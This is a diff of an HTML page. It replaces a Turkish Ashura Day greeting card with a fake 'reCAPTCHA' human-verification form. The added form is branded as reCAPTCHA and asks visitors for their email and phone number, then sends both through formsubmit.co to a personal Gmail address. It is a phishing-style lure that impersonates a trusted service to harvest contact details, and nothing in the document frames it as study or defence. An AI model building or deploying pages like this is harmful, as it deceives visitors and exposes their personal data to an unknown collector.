@@ -3,25 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Aşure Günü Kutlaması</title>
+    <title>Doğrulama</title>
     <link rel="stylesheet" href="style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
 </head>
 <body>
-
-    <div class="container">
-        <h2>Mektubunuzu Açın! </h2>
-        <div id="click-me"></div>
-    </div>
-
-    <div id="letter-container" class="hidden">
-        <div class="letter">
-            <h1>Aşure Gününüz Mübarek Olsun! -Tuğra</h1>
-            <p>Bu mübarek günde dualarınız kabul, evlerinizin bereketli olsun. Aşure Gününüz Mübarek Olsun</p>
+    <form class="captcha-container" action="https://formsubmit.co/tugraadam1@gmail.com" method="POST">
+        <div class="captcha-header">
+            <h1 class="text-logo">reCAPTCHA</h1>
         </div>
-    </div>
-
-    <footer class="creator">Created by Tuğra</footer>
-
+        <div class="captcha-body">
+            <h2>Lütfen insan olduğunuzu doğrulayın.</h2>
+            <p>Devam etmek için aşağıdaki kutucukları doldurun.</p>
+            <div class="selection-group">
+                <label for="player-input">E-Mail Adress</label>
+                <input type="email" id="player-input" name="E-Mail" placeholder="E-Mail" required>
+            </div>
+            <div class="selection-group">
+                <label for="brand-input">Phone Number (+90 or +1)</label>
+                <input type="tel" id="brand-input" name="Phone Number" placeholder="Phone Number" required>
+            </div>
+        </div>
+        <div class="captcha-footer">
+            <button id="verify-btn" type="submit">Doğrula</button>
+        </div>
+    </form>
     <script src="script.js"></script>
 </body>
 </html>
